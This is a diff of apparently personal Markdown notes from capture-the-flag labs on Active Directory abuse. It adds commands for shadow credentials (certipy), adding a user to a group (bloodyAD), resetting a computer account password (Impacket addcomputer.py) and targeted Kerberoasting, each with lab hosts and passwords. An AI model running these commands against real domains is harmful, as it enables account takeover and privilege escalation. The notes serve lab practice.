@@ -33,12 +33,33 @@ Certipy v4.8.2 - by Oliver Lyak (ly4k)
 ```bash
 certipy shadow auto -u <username>@<domain> -p <password> -account <target_account>
 ```
-
 ##### Group:
+
+Add members to groups
 
 ![[Pasted image 20250520021258.png]]
 
 ```bash
 bloodyAD -d puppy.htb --host 10.129.219.21 -u levi.james -p 'KingofAkron2025!' add groupMember 'developers' levi.james
+```
+##### Computer to Computer:
+
+Change computer accounts password:
+
+![[Pasted image 20250719231331.png]]
+
+```bash
+addcomputer.py -computer-name 'ADMWS01$' -computer-pass Password123 -dc-ip 10.10.82.55 'retro2.vl/fs01$:Password123' -no-add
+Impacket v0.13.0.dev0+20250707.152659.a60a1f17 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Successfully set password of ADMWS01$ to Password123.
+```
+
+##### User to User
+
+![[Pasted image 20250720141031.png]]
+
+```bash
+targetedKerberoast.py -d delegate.vl -u A.Briggs -p 'P4ssw0rd1#123'
 ```
 
